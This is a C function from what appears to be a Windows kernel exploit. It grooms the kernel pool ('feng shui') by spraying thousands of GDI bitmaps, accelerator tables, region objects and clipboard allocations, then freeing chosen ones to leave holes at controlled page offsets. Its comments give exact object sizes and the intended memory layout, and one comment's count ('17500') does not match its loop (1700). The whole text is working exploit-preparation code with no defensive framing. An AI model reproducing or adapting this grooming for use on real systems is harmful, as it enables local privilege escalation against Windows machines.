void fungshuei() {
	HBITMAP bmp;
	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
	for (int k = 0; k < 5000; k++) {
		//bmp = CreateBitmap(1685, 2, 1, 8, NULL); //800 = 0x8b0 820 = 0x8e0 1730 = 0x1000 1700 = 0xfc0 1670 = 0xf70
		bmp = CreateBitmap(1670, 2, 1, 8, NULL);										 // 1680  = 0xf80 1685 = 0xf90 allocation size 0xfa0
		bitmaps[k] = bmp;
	}

	HACCEL hAccel, hAccel2;
	LPACCEL lpAccel;
	// Initial setup for pool fengshui.  
	lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
 	// Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
	HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	for (INT i = 0; i < 7000; i++) {
		hAccel = CreateAcceleratorTableA(lpAccel, 1);
		hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
		pAccels[i] = hAccel;
		pAccels2[i] = hAccel2;
	}
	// Delete the allocated bitmaps to free space at beiginig of pages
	for (int k = 0; k < 5000; k++) {
		DeleteObject(bitmaps[k]);
	}
	//allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
	for (int k = 0; k < 5000; k++) {
		CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
	}
	// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
		bitmaps[k] = bmp;
	}
	// Allocate 17500 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
	for (int k = 0; k < 1700; k++) { //1500
		AllocateClipBoard2(0x30);
	}
	// delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
	for (int k = 2000; k < 4000; k++) {
		DestroyAcceleratorTable(pAccels[k]);
		DestroyAcceleratorTable(pAccels2[k]);
	}
	
}